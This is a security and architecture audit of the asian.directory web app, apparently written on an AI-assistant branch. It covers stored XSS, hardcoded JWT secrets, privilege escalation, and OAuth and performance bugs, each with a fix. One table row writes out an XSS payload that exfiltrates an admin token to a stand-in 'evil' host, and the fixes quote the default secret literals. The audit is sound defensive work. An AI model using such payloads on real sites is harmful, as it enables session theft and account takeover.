# asian.directory — Deep Architecture & Bug Analysis

**Scope:** full-stack audit of the frontend (static HTML/JS) and backend (Express + dual SQL).
**Commit baseline:** `7e97a2a` (branch `claude/website-architecture-analysis-luwrmu`).
**Method:** static read of `index.html`, `admin-login.html`, `admin-dashboard.html`, `backend/server.js`, `backend/database-postgres.js`, `backend/database.js`, deployment manifests.

Sequenced macro → micro. All line references are against the baseline commit.

---

## 1. Technology Stack & Linguistic Analysis

### 1.1 Stack inventory

| Layer | Technology | Version / Source | Notes |
|---|---|---|---|
| Frontend markup | Hand-authored HTML5, 3 pages | `index.html`, `admin-login.html`, `admin-dashboard.html` (2046 LOC) | No component model, no templating engine |
| Frontend styling | Tailwind CSS | `cdn.tailwindcss.com` (runtime JIT) | **Dev-only CDN build shipped to prod** — see BUG-P1 |
| Frontend logic | Vanilla ES2020 | Inline `<script>` per page | No framework, no bundler, no transpile, module-global state |
| Fonts | Inter | Google Fonts `<link>` | Render-blocking, third-party |
| Runtime | Node.js 18 | `nixpacks.toml` | Pinned |
| HTTP framework | Express | `^4.18.2` | Single-file monolith (`server.js`, 1929 LOC) |
| AuthN | `jsonwebtoken ^9`, `bcryptjs ^2.4` | JWT (HS256, 24h), bcrypt cost 10 | Token in `localStorage` |
| AuthN (federated) | Google + Facebook OAuth2 | Hand-rolled over `https` module | No passport; manual state cookie |
| Security middleware | `helmet ^7`, `express-rate-limit ^7`, `cookie-parser` | Helmet CSP **disabled** | See SEC table |
| DB (primary) | PostgreSQL via `pg ^8.11` | Railway plugin, `DATABASE_URL` | Pool max 20, JSONB columns |
| DB (fallback) | SQLite via `better-sqlite3 ^11` (optionalDependency) | Local dev only | Parallel 900-LOC module |
| Hosting (frontend) | GitHub Pages (Jekyll workflow) | `.github/workflows/jekyll-gh-pages.yml`, `CNAME` | CDN-fronted static |
| Hosting (backend) | Railway (Nixpacks) | `railway.json`, `Procfile` | Also serves static as fallback |

### 1.2 Idiomaticity assessment

**Backend — competent, dated.** Consistent `async/await`, uniformly parameterized SQL (no string interpolation of user values), a single `{success, data|error}` envelope, and a reasonable middleware chain. Weaknesses are structural rather than syntactic: no router modularization (60+ routes in one file), no validation layer (every handler re-implements `if (!x) return 400` by hand), no service/repository separation (routes call `dbOperations` directly), and a stylistic seam where callback-style `jwt.verify` is mixed into otherwise-promise code (`server.js:209`, `:223`). The **two hand-maintained DB modules** (`database.js` / `database-postgres.js`) duplicate ~900 lines each and have already diverged (schema, see BUG-B4) — this is the single biggest maintainability liability.

**Frontend — non-idiomatic for 2026.** State is module-global mutable (`businesses`, `allBusinesses`, `currentUser`, `dashboardData`); every view is rebuilt by concatenating HTML strings and assigning `innerHTML`, which (a) destroys and recreates DOM on each navigation, (b) drops event listeners forcing reliance on inline `onclick=` handlers and delegation, and (c) is the root of the app-wide XSS exposure (SEC-1). There is no escaping helper anywhere in the codebase. The `API_BASE_URL` autodetection block is copy-pasted verbatim into all three pages.

### 1.3 Data-flow protocol (frontend state ↔ API ↔ schema)

- **Public path (`index.html`):**
  - On load → `GET /api/businesses` → hydrates global `businesses[]` (used *only* as an offline fallback — a wasted unbounded fetch, see BUG-P2).
  - On query → `GET /api/businesses/search?q=` → `dbOperations.searchBusinesses` → `SELECT … WHERE status='active' AND (LIKE …)` → rendered into `#chat-container` via `innerHTML +=`.
  - Side effect → `POST /api/conversations` persists `{userQuery, aiResponse[], businessIds[]}` into `conversations` (JSONB `ai_response`). No auth, no CSRF (explicitly skipped, `server.js:143`).
- **Admin path (`admin-dashboard.html`):**
  - `api(path)` wrapper (`:703`) attaches `Authorization: Bearer <localStorage.adminToken>`; on `401` calls `logout()`.
  - Reads fan out to `/crm/*`, `/businesses`, `/users`, `/keys`, `/analytics`, `/audit-log`; writes go through `PUT/PATCH/POST/DELETE` guarded server-side by `authenticateToken` (+ `requireRole` on a subset).
- **Schema coupling:** JSONB fields (`socials`, `keywords`, `business_hours`, `target_audience`, `special_offerings`, `custom_fields`) are normalized on read by `parseBusiness()` and re-serialized with `JSON.stringify` on write — the contract is implicit (no schema/DTO). The `pipeline_stage` vocabulary is **not** shared between writer and readers (BUG-B1).

---

## 2. Structural & Architectural Mapping

- **System topology — "split-brain" static hosting.**
  - Frontend is deployed *twice*: to **GitHub Pages** (via Jekyll Action, custom domain `asian.directory`) and again served by **Express `static`** on Railway (`server.js:193`) with a SPA catch-all (`server.js:1859`). The same three HTML files live behind two independent deploy pipelines → **content drift** is inevitable (a fix pushed to `main` reaches Pages on merge but Railway only on redeploy, or vice-versa).
  - Cross-origin by construction: browser loads HTML from `asian.directory`, JS then calls the hardcoded Railway origin (`index.html:129`). This is why `credentials`, CORS allow-list, and OAuth redirects all have to be threaded manually.
- **Backend — modular monolith, thin.**
  - Single process, single Express app; no queue, no workers, no cache tier (Redis absent). "Serverless" only in the loose Railway sense.
  - Layering: `route handler → dbOperations.<fn> → pg.Pool`. No domain layer; business rules (win-score math, stagnation, forecast) live *inside* the DB module (`database-postgres.js:1066-1221`), mixing persistence with logic.
- **Dependency / coupling.**
  - `server.js` hard-depends on the shape of `dbOperations`; the two DB modules are the coupling seam and are **not** interface-guaranteed to match. Optional `better-sqlite3` degrades to an exported stub (`database.js:8-13`) so prod-on-PG never loads it — sound.
  - Frontend → backend coupling is a hardcoded production hostname (`asiandirectory-production-7ec4.up.railway.app`) baked into all three pages.
- **Data processing / query efficiency.**
  - Reasonable index coverage on `businesses(status, category, country, pipeline_stage, created_at, LOWER(name))` and FK/lookup columns (`database-postgres.js:327-345`).
  - **Search is non-sargable**: `LOWER(col) LIKE '%term%'` with a leading wildcard cannot use `idx_businesses_name_lower` → sequential scan on every search; multi-term conditions are **OR-joined** (`database-postgres.js:506`) so precision collapses as the query lengthens. No `pg_trgm` / GIN / FTS.
  - **Fan-out reads**: `getBusinessStats` issues 8 sequential round-trips (`:617-627`); `getCrmDashboardStats` (`:1209`) chains stats + stagnation (correlated subqueries per row, `:1165-1177`) + forecast — all awaited serially.
  - **No default pagination** on `getAllBusinesses` (`:469`) → `/api/businesses` and `/api/businesses/export` can stream the entire table.
  - **Caching layer: none.** Public `categories`/`countries`/`businesses` are recomputed per request.

---

## 3. Bug Diagnostic & Vulnerability Audit

### 3.1 Security vulnerability matrix

| ID | Severity | Location | Vulnerability | Impact |
|---|---|---|---|---|
| SEC-1 | **Critical** | `admin-dashboard.html:1689` (analytics `user_query`), `:1720` (audit `new_values`), `:1548-1555` (users), `:917-919`/`:1029-1032` (businesses), `badge()` `:724`; `index.html:298-334` | **Stored XSS, app-wide** — every render interpolates server fields into `innerHTML` with **no escaping helper anywhere** | **Unauthenticated → admin takeover**: an anonymous visitor types `<img src=x onerror=fetch('//evil/?'+localStorage.adminToken)>` into the public search box → persisted via `POST /conversations` → rendered raw on the admin **Analytics** page (`:1689`) → script runs with the admin session, exfiltrates `adminToken` from `localStorage`. Same chain via a `viewer`'s `display_name` on the Users page |
| SEC-2 | **Critical** | `server.js:32-33` | JWT/CSRF secrets fall back to **hardcoded literals** if env unset | Anyone who knows the default forges admin JWTs. Prod must fail-closed, not default |
| SEC-3 | **Critical** | `server.js:438-460`, `:526-537` | **Privilege-escalation bootstrap**: open `/register`; first user → `admin`; and *any* login auto-promotes to `admin` whenever `adminCount===0` | If the sole admin is ever deactivated/deleted, the next person to log in silently becomes admin. Also a TOCTOU race → multiple admins |
| SEC-4 | High | `index.html:129`, `admin-login.html:224`, `server.js:672`,`:760` | **JWT stored in `localStorage`** and **passed in URL query** on OAuth redirect | localStorage token is directly stealable via SEC-1; URL token lands in history/logs. Prefer `HttpOnly; Secure; SameSite` cookie |
| SEC-5 | High | `database-postgres.js:9` | `ssl: { rejectUnauthorized: false }` in production | DB connection accepts any cert → MITM of the Postgres channel |
| SEC-6 | High | `server.js` (no `app.set('trust proxy')`) | Behind Railway's proxy, `req.ip` is the edge address | Rate-limit buckets (`server.js:88-111`) collapse across all clients (throttle-all or bypass); `audit_log.ip_address` and API-usage IPs are all wrong. express-rate-limit v7 also validation-warns on this |
| SEC-7 | Med | `server.js:931` (`POST /api/businesses` = `authenticateToken` only) | **No role gate on content creation** — any registered `viewer` can create businesses/tags/communications | Combined with SEC-1, a low-priv account is the XSS injection vector |
| SEC-8 | Med | `server.js:58-60` | Helmet **CSP disabled** (`contentSecurityPolicy: false`) | Removes the one mitigation that would blunt SEC-1. (It's off to accommodate the inline-script frontend + Tailwind CDN) |
| SEC-9 | Low | `server.js:64-76`, `:672` | CORS reflects allow-list with `credentials:true`; OAuth redirect target is `ALLOWED_ORIGINS[0]` | Fragile; a misordered env var silently redirects tokens to the wrong origin |

### 3.2 Correctness / logic bug matrix

| ID | Severity | Location | Defect | Failure scenario |
|---|---|---|---|---|
| BUG-B1 | **High** | `server.js:853` vs `:1177` vs `database-postgres.js:1087`,`:1195`; `admin-dashboard.html:734` | **Three incompatible `pipeline_stage` vocabularies.** Bulk-update accepts `qualified/proposal/negotiation/on_hold/lost/churned`; pipeline board + win-score + stagnation + `stageLabel` only know `in_review/verified/inactive` | Bulk-moving a lead to `qualified` makes it vanish from the pipeline board and score as stage-factor `0`; `stageLabel` shows a raw slug. Data-integrity + UX breakage |
| BUG-B2 | **High** | `server.js:659-665` (`createOAuthUser`); unique email index `database-postgres.js:72-75`, `database.js:31` | **OAuth account-linking crash.** `createOAuthUser` does `ON CONFLICT(username)` but a pre-existing row with the *same email* under a different username violates the unique email index → unhandled rejection → 500 | Email/password user later "Sign in with Google" using the same email → login hard-fails |
| BUG-B3 | **High** | `server.js:670-672` (callback redirect) vs `admin-login.html:221-226` (token consumer) | **OAuth never completes.** Callback redirects to site **root** `/?token=…`, but only `admin-login.html` reads the `token` param; `index.html` ignores it | Every Google/Facebook sign-in silently drops the user on the landing page, unauthenticated |
| BUG-B4 | Med | `database.js:31` (`email TEXT UNIQUE`) vs `database-postgres.js:72-75` (partial unique WHERE NOT NULL) | **Schema divergence** between the two DB backends | Behavior differs local vs prod; multi-NULL-email semantics inconsistent |
| BUG-B5 | Med | `server.js:1027-1044` (`PATCH /businesses/:id`) | Per-field update loop = N separate `UPDATE`s, **non-atomic**, N round-trips; silently swallows disallowed fields | A mid-loop failure leaves a partially-updated row with a `200`-ish partial result; N+1 latency |
| BUG-B6 | Med | `server.js:459` | `const userCount = await dbOperations.getUserCount ? await dbOperations.getUserCount() : null` — awaits a **function reference** (always truthy) as the guard | Works by accident; if `getUserCount` were ever undefined this throws instead of taking the `null` branch. Fragile intent |
| BUG-B7 | Low | `index.html:388-397` (offline fallback) | Fallback reads `business.keywords.join(' ')` but API businesses may deliver `keywords` already parsed/absent | Throws inside the `catch`, masking the original network error |
| BUG-B8 | Low | `server.js:269-283` | API-usage logging on `res.on('finish')` is fire-and-forget across an `await`-less boundary | Under load, unhandled log failures only `console.error`; usage undercounts |
| BUG-B9 | Med | `admin-dashboard.html:697-698` | Auth gate `if (!token) window.location.href=...` has **no `return`** — script keeps running | `init()` fires authenticated calls with `Bearer null`; the `token` `const` is captured once, so a token refreshed in another tab is never used |
| BUG-B10 | Med | `admin-dashboard.html:1975-1981` | CSV export does an authed `api()` fetch, discards it, then `window.open`s the URL — browser navigation **cannot send the `Authorization` header** | CSV export is broken from the browser (or silently unauthenticated if the backend permits) |
| BUG-B11 | Low | `admin-dashboard.html:966`,`:992`,`:832` | Unguarded null derefs: `forecast.velocity.*`, `forecast.pipeline.reduce`, `d.businesses.byPipeline` (siblings use `?.`) | A `{success:true,data:{}}` response throws a TypeError and aborts the entire page render |
| BUG-B12 | Low | `admin-dashboard.html:704` | `api()` builds `{headers:{...}, ...options}` with `...options` spread **after** `headers` | Any caller passing `options.headers` clobbers the merged auth header — latent trap |
| BUG-B13 | Low | `admin-dashboard.html:1225-1228` | `quickActivity` uses `setTimeout(...,300)` to wait for an async render | The 300 ms guess can fire before the form DOM exists → business select silently unset |

### 3.3 Frontend rendering / Core Web Vitals

| ID | Severity | Location | Issue | CWV impact |
|---|---|---|---|---|
| BUG-P1 | **High** | `index.html:15`, `admin-login.html:11`, `admin-dashboard.html` | **Tailwind runtime CDN (`cdn.tailwindcss.com`) in production.** It's a render-blocking JS compiler explicitly "not for production" | Large blocking script + FOUC → poor LCP/FCP, CLS on hydrate |
| BUG-P2 | Med | `index.html:407-418` | Unbounded `GET /api/businesses` on every landing, result used only as offline fallback | Wasted payload/latency on the critical path |
| BUG-P3 | Med | `admin-dashboard.html` render fns; `index.html:256`,`:274`,`:353` | Full-table/full-list re-render via `innerHTML +=` / `innerHTML =` on each navigation; unbounded DOM growth in chat | Reflow storms, memory growth, INP regression on large datasets |
| BUG-P4 | Low | `admin-dashboard.html:1492-1503` (`recalcAllScores`) | Client-side **N+1**: one `POST /crm/win-score/:id` per business, sequentially | UI blocks proportional to catalog size |
| BUG-P5 | Low | `index.html:16`, Google Fonts | Render-blocking third-party stylesheet, no `preconnect`/`font-display` swap on the link | FCP delay |
| BUG-P6 | Med | `admin-dashboard.html:1902`,`:1190`,`:1325`,`:1629`,`:1492` | **No double-submit guard** — submit buttons never disabled during the `await` | Double-click creates duplicate businesses/activities/keys; re-clicking `recalcAllScores` runs a second full N-request loop concurrently |
| BUG-P7 | Low | `admin-dashboard.html:1679` (`renderBarChart`) | `Math.max(...)` recomputed over the full array **inside** `.map` → O(n²) | Analytics chart render cost grows quadratically |

---

## 4. Optimization & Enhancement Blueprint

### 4.1 Prioritized roadmap (impact × effort)

| # | Action | Impact | Effort | Addresses |
|---|---|---|---|---|
| 1 | Add a single HTML-escape helper and route **all** interpolated user data through it (or switch to `textContent`/`<template>`). Re-enable a strict Helmet CSP | 🔴 Critical | S | SEC-1, SEC-8 |
| 2 | Fail-closed on missing `JWT_SECRET`/`CSRF_SECRET` (throw at boot). Rotate any secret ever deployed with the default | 🔴 Critical | XS | SEC-2 |
| 3 | Replace the "first user / auto-promote" bootstrap with an explicit seeded admin or one-time setup token; gate `/register` (invite-only or role always `viewer`) | 🔴 Critical | S | SEC-3, SEC-7 |
| 4 | Move JWT to `HttpOnly; Secure; SameSite=Strict` cookie; stop putting tokens in URLs (POST the code, or set cookie server-side then redirect) | 🟠 High | M | SEC-4 |
| 5 | `app.set('trust proxy', 1)`; verify rate-limit keys + `req.ip` | 🟠 High | XS | SEC-6 |
| 6 | Unify `pipeline_stage` into one shared constant (single source imported by validation, board, win-score, `stageLabel`) | 🟠 High | S | BUG-B1 |
| 7 | Fix OAuth: (a) link by email inside `createOAuthUser` (upsert on email OR catch `23505` and merge); (b) redirect callback to `admin-login.html` (or a dedicated `/auth/callback` that consumes the token) | 🟠 High | M | BUG-B2, BUG-B3 |
| 8 | Replace Tailwind CDN with a built stylesheet (Tailwind CLI/PostCSS, purged); self-host Inter with `font-display:swap` | 🟠 High | M | BUG-P1, BUG-P5 |
| 9 | Default `LIMIT`/`OFFSET` + `Cache-Control` on public list/search; parallelize stat fan-outs with `Promise.all` | 🟡 Med | S | §2, BUG-P2 |
| 10 | Full-text/trigram search (`pg_trgm` GIN or `tsvector`); AND-join multi-term | 🟡 Med | M | §2 |
| 11 | Collapse the two DB modules behind one interface (or standardize on PG + testcontainers) to kill drift | 🟡 Med | L | BUG-B4, idiomaticity |
| 12 | Make PATCH atomic (single dynamic `UPDATE` in a transaction) | 🟡 Med | S | BUG-B5 |
| 13 | Split `server.js` into routers + a validation layer (`zod`/`express-validator`) + service layer | 🟢 Low | L | maintainability |

### 4.2 Compute-latency (backend)

- **Parallelize stat aggregation.** `getBusinessStats` / `getDashboardStats` should `Promise.all` their independent counts (8 serial → 1 wave), and ideally collapse into a single grouped query with `FILTER (WHERE …)`.
- **Search.** Add `CREATE INDEX … USING GIN (to_tsvector('simple', name||' '||description||' '||coalesce(keywords::text,'')))` and query with `@@ plainto_tsquery`, or `pg_trgm` for fuzzy `LIKE`. Removes the seq-scan-per-search.
- **Bounded reads + cache.** Enforce a server-side max `LIMIT` (public API already clamps to 200 at `server.js:1792` — apply the same to `/api/businesses`), and put a short `Cache-Control`/edge cache on `categories`, `countries`, and the public list.
- **Batch win-score.** Replace the client N+1 with `POST /api/crm/win-scores/recalculate` computing all scores in one set-based pass.

### 4.3 Rendering speed (frontend)

- **Ship compiled CSS** (purged Tailwind) instead of the runtime CDN → removes the largest render-blocking resource and the FOUC.
- **Escape-once, then `textContent`** for text nodes; reserve `innerHTML` for trusted static shells. Eliminates SEC-1 *and* the reflow cost of string re-render.
- **Incremental DOM**: append single result nodes rather than re-serializing the whole list; virtualize long admin tables.
- **`preconnect`** to the API origin and font host; self-host Inter.

### 4.4 Architectural shifts / tooling

- **Collapse hosting to one origin.** Serve the frontend from the Railway app (already possible via `express.static`) *or* keep Pages and treat Railway as API-only — but not both maintaining copies. Removes drift, simplifies CORS/OAuth to same-origin cookies.
- **Introduce a build step** (Vite) even without a framework: bundling, purged CSS, env injection (kills the hardcoded Railway hostname), and a lint/typecheck gate.
- **Single DB path** (PostgreSQL everywhere, SQLite only via a thin adapter or dropped) with migrations (`node-pg-migrate`) replacing the ad-hoc `ALTER TABLE … EXCEPTION WHEN duplicate_column` blocks.
- **Validation + router modularization** on the backend; add integration tests around auth/RBAC and the pipeline vocabulary.

---

## 5. Critical Fixes — Before / After

### FIX-1 — Stored XSS (SEC-1)

The dashboard/user render path is the highest-severity issue.

**Before** (`admin-dashboard.html:1548-1552`)
```js
<td class="px-4 py-3 font-medium">${u.display_name || u.username}</td>
<td class="px-4 py-3 text-gray-500 hidden sm:table-cell">${u.email || '-'}</td>
...
${['admin','editor','viewer'].map(r => `<option value="${r}" ${u.role===r?'selected':''}>${r}</option>`).join('')}
```

**After** — escape every dynamic value (add once, reuse everywhere, incl. `index.html`)
```js
const esc = s => String(s ?? '').replace(/[&<>"']/g, c =>
  ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;' }[c]));

// ...
<td class="px-4 py-3 font-medium">${esc(u.display_name || u.username)}</td>
<td class="px-4 py-3 text-gray-500 hidden sm:table-cell">${esc(u.email) || '-'}</td>
```
Then re-enable CSP (`server.js:58`) with `default-src 'self'` once inline scripts are externalized.

### FIX-2 — Secrets fail-closed (SEC-2)

**Before** (`server.js:32-33`)
```js
const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-key-please-change-in-production-use-env-variable';
const CSRF_SECRET = process.env.CSRF_SECRET || 'csrf-dev-secret-change-in-production';
```

**After**
```js
const JWT_SECRET = process.env.JWT_SECRET;
const CSRF_SECRET = process.env.CSRF_SECRET;
if (process.env.NODE_ENV === 'production' && (!JWT_SECRET || !CSRF_SECRET)) {
    console.error('FATAL: JWT_SECRET and CSRF_SECRET must be set in production.');
    process.exit(1);
}
```

### FIX-3 — Privilege-escalation bootstrap (SEC-3)

**Before** (`server.js:526-537`)
```js
// Auto-promote to admin if no admin exists yet
let role = user.role;
if (role !== 'admin' && dbOperations.getAdminCount) {
    const adminCount = await dbOperations.getAdminCount();
    if (adminCount === 0) { await dbOperations.promoteToAdmin(user.id); role = 'admin'; }
}
```

**After** — remove auto-promotion entirely; provision the first admin explicitly.
```js
const role = user.role; // never mutate role at login
// Seed the initial admin out-of-band (migration/CLI) or with a one-time ADMIN_BOOTSTRAP_TOKEN
// checked only at /register, never at /login.
```

### FIX-4 — Unify pipeline stages (BUG-B1)

**Before** — three divergent lists (`server.js:853`, `server.js:1177`, `database-postgres.js:1087`).

**After** — one shared constant, imported everywhere validation/rendering happens.
```js
// backend/constants.js
const PIPELINE_STAGES = ['new_lead','contacted','in_review','verified','active_listing','inactive'];
module.exports = { PIPELINE_STAGES };
// server.js bulk-pipeline:
const { PIPELINE_STAGES } = require('./constants');
if (!PIPELINE_STAGES.includes(pipeline_stage)) return res.status(400).json({ success:false, error:'Invalid pipeline stage' });
```
(Frontend `stageLabel` keys must match the same set.)

### FIX-5 — Trust proxy (SEC-6)

**Before** — absent.

**After** (`server.js`, immediately after `const app = express()`)
```js
app.set('trust proxy', 1); // Railway terminates TLS at one proxy hop
```
This restores correct `req.ip`, per-client rate limiting, and accurate audit/usage IPs.

---

*Severity legend: 🔴 Critical (exploitable now / data-integrity break) · 🟠 High · 🟡 Med · 🟢 Low. Effort: XS < S < M < L.*
